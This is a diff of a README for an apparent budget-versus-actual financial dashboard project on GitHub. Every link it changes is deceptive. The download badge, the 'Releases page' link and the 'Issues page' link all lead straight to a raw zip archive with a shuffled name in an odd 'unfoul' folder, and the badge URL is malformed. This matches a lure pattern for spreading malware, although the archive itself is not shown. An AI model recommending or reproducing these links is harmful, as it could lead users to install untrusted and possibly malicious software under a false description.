@@ -7,7 +7,7 @@ Welcome to the **Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard**! This app
 
 ## 📥 Download Now
 
-[![Download Release](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/vs-Strategic-Actual-Dashboard-Bv-Budget-1.4.zip%https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/vs-Strategic-Actual-Dashboard-Bv-Budget-1.4.zip)](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/vs-Strategic-Actual-Dashboard-Bv-Budget-1.4.zip)
+[![Download Release](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/Budget-vs-Dashboard-Actual-Strategic-Bv-v1.7-beta.4.zip%https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/Budget-vs-Dashboard-Actual-Strategic-Bv-v1.7-beta.4.zip)](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/Budget-vs-Dashboard-Actual-Strategic-Bv-v1.7-beta.4.zip)
 
 ## 📋 Description
 
@@ -19,7 +19,7 @@ This tool provides insight into your budget performance. It shows:
 
 ## 📥 Download & Install
 
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/vs-Strategic-Actual-Dashboard-Bv-Budget-1.4.zip). On that page, you will find the latest version available for download.
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/Budget-vs-Dashboard-Actual-Strategic-Bv-v1.7-beta.4.zip). On that page, you will find the latest version available for download.
 
 1. Click on the **latest release**.
 2. Select the appropriate file based on your system (e.g., Windows, Mac, etc.).
@@ -71,7 +71,7 @@ This application relates to several important areas in financial management:
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please check the [Issues page](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/vs-Strategic-Actual-Dashboard-Bv-Budget-1.4.zip) for assistance or to submit your feedback.
+If you encounter any issues or have questions, please check the [Issues page](https://raw.githubusercontent.com/leo12314234/Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard/main/unfoul/Budget-vs-Dashboard-Actual-Strategic-Bv-v1.7-beta.4.zip) for assistance or to submit your feedback.
 
 Thank you for using **Strategic-Budget-vs.-Actual-BvA-Strategic-Dashboard**! We hope it enhances your budgeting experience.
 ```
